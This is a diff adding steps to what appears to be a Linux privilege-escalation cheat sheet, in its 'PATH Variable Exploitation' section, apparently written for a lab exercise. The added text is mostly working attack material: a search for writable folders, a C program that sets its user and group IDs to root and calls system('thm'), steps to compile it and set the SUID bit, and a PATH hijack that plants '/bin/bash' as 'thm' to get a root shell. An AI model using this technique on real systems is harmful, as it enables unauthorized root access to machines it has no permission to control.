@@ -210,6 +210,13 @@ ls -la /path/script.sh
 
 # 7. PATH Variable Exploitation
 
+Be sure you can answer the questions below before trying this:
+```
+What folders are located under $PATH
+Does your current user have write privileges for any of these folders?
+Can you modify $PATH?
+Is there a script/application you can start that will be affected by this vulnerability?
+```
 Check PATH:
 
 ```bash
@@ -235,6 +242,40 @@ Modify PATH:
 
 ```bash
 export PATH=/tmp:$PATH
+```
+Find writable folders
+```
+find / -writable 2>/dev/null
+```
+
+Go there (for example, /tmp) and create this:
+
+```
+#include <unistd.h>
+
+void _init() {
+    setgid(0);
+    setuid(0);
+    system("thm");
+}
+```
+
+Compile this into an executable and set the SUID bit.
+
+```
+gcc path_exp.c -o path -w
+chmod u+s path
+ls -la
+```
+
+Once executed, “path” will look for an executable named “thm” inside folders listed under PATH.
+
+```
+cd /tmp
+export PATH=/tmp:$PATH
+echo "/bin/bash" > thm
+chmod 777 thm
+./path
 ```
 
 ---
